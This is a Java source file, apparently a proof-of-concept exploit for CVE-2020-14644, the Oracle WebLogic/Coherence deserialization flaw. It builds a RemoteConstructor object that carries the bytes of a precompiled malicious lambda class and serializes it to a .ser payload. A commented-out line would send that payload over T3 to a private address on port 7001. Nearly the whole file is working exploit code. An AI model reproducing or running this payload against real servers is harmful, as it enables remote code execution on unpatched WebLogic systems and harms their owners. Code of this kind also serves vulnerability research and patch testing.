package com.supeream;

import com.tangosol.internal.util.invoke.ClassDefinition;
import com.tangosol.internal.util.invoke.ClassIdentity;
import com.tangosol.internal.util.invoke.RemoteConstructor;
import com.tangosol.internal.util.invoke.lambda.LambdaIdentity;
import com.tangosol.util.Base;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;


public class CVE_2020_14644 {

    public static void main(String[] args) throws Exception {
//        String md5 = getLambdaIdentityMd5();
        poc();
    }

    private static String getLambdaIdentityMd5() throws ClassNotFoundException {
        String md5 = getClassIdentity(Class.forName("com.tangosol.internal.util.invoke.lambda.LambdaIdentity"));
        System.out.println(md5);
        return md5;
    }

    public static void poc() throws Exception{
        String serFile = "CVE-2020-14644.ser";
        // T3 send, you can also use python script. weblogic_t3.py
//        T3ProtocolOperation.send("172.16.1.130", "7001", payload);

        // for 12.2.1.4 only.
        String path = "C:\\Users\\Administrator\\Downloads\\CVE-2020-2555-master\\src\\com\\tangosol\\internal\\util\\invoke\\lambda\\LambdaIdentity$423B02C050017B24DB10DFF759AA56BF.class";
        Object obj = generatePayload(path);
        // test
        //serialize(obj, args[2]);
        serialize(obj, serFile);
        //deserialize();
    }

    public static Object generatePayload(String path) throws IOException{
        byte[] bytes = Files.readAllBytes(Paths.get(path));
        RemoteConstructor constructor = new RemoteConstructor(
                new ClassDefinition(new ClassIdentity(LambdaIdentity.class), bytes), new Object[]{}
        );

        return constructor;
    }

    public static void serialize(Object obj, String serFile) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream(serFile));
            os.writeObject(obj);
            os.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void deserialize(String serFile) {
        try {
            ObjectInputStream is = new ObjectInputStream(new FileInputStream(serFile));
            is.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String getClassIdentity(Class<?> clazz) {
        return Base.toHex(md5(clazz));
    }


    public static byte[] md5(Class<?> clazz) {
        try {
            InputStream in = clazz.getClassLoader().getResourceAsStream(clazz.getName().replace('.', '/') + ".class");
            Throwable var2 = null;

            byte[] var3;
            try {
                var3 = md5(in);
            } catch (Throwable var13) {
                var2 = var13;
                throw var13;
            } finally {
                if (in != null) {
                    if (var2 != null) {
                        try {
                            in.close();
                        } catch (Throwable var12) {
                            var2.addSuppressed(var12);
                        }
                    } else {
                        in.close();
                    }
                }

            }

            return var3;
        } catch (IOException var15) {
            throw Base.ensureRuntimeException(var15);
        }
    }


    public static byte[] md5(InputStream in) {
        return digest("MD5", in);
    }

    protected static byte[] digest(String sAlgorithm, InputStream in) {
        try {
            MessageDigest digest = MessageDigest.getInstance(sAlgorithm);
            byte[] ab = new byte[1024];

            int cb;
            while((cb = in.read(ab, 0, 1024)) > 0) {
                digest.update(ab, 0, cb);
            }

            return digest.digest();
        } catch (IOException | NoSuchAlgorithmException var5) {
            throw Base.ensureRuntimeException(var5);
        }
    }


    public static String toHex(byte[] ab) {
        final char[] HEX = "0123456789ABCDEF".toCharArray();

        int cb = ab.length;
        char[] ach = new char[cb * 2];
        int ofb = 0;

        for(int var4 = 0; ofb < cb; ++ofb) {
            int n = ab[ofb] & 255;
            ach[var4++] = HEX[n >> 4];
            ach[var4++] = HEX[n & 15];
        }

        return new String(ach);
    }
}
